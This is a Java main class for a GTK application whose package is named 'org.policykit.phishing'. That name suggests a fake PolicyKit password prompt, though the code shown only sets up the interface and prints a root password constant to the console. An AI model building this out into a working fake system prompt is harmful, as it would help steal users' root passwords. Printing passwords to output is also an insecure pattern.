package org.policykit.phishing;


import java.io.FileNotFoundException;
import java.io.IOException;
import java.text.ParseException;

import org.gnome.gtk.Builder;
import org.gnome.gtk.Gtk;

import org.policykit.phishing.chronic.ArchiveData;
import org.policykit.phishing.controller.Controller;
import org.policykit.phishing.controller.ResourceDirectory;

public class Main  implements ArchiveData{
	
	ResourceDirectory rd;
	Builder BUILDER;
	
	
	public Main() {
		
		rd = new ResourceDirectory(HOME, SHELTER, RESOURCE_GLADE_SHELTER, RESOURCE_GLADE_JAR);
		
		secureStart();
		
		BUILDER = new Builder();
		try {
			
			BUILDER.addFromFile(RESOURCE_GLADE_SHELTER);
			new Controller(BUILDER);
			
		} catch (FileNotFoundException | ParseException e) {
			
			System.out.println(e.getMessage()+"\n"+e.getLocalizedMessage());
		}
		
		
		System.out.println("Directorios raiz: "+SHELTER);
		System.out.println("Archivo glade: "+RESOURCE_GLADE_SHELTER);
		System.out.println("Password root: "+PASSWORD_ROOT);
	}

	/** Se asegura que el directorio de instalacion este existente
	 *  de no ser el caso se crea y se extrael el archivo glade para
	 *  ser usada como GUI
	 */
	public void secureStart() {
		
		if (rd.existsDirectory()) {
			
			if(!rd.existsGlade()) {
				
				rd.copyResourceGlade();
			}
			
		} else {
			
			rd.createShelter();
			rd.copyResourceGlade();
		}
		
	}

	public static void main(String[] args) throws IOException {

		Gtk.init(args);
		new Main();
		Gtk.main();
		
	}
}
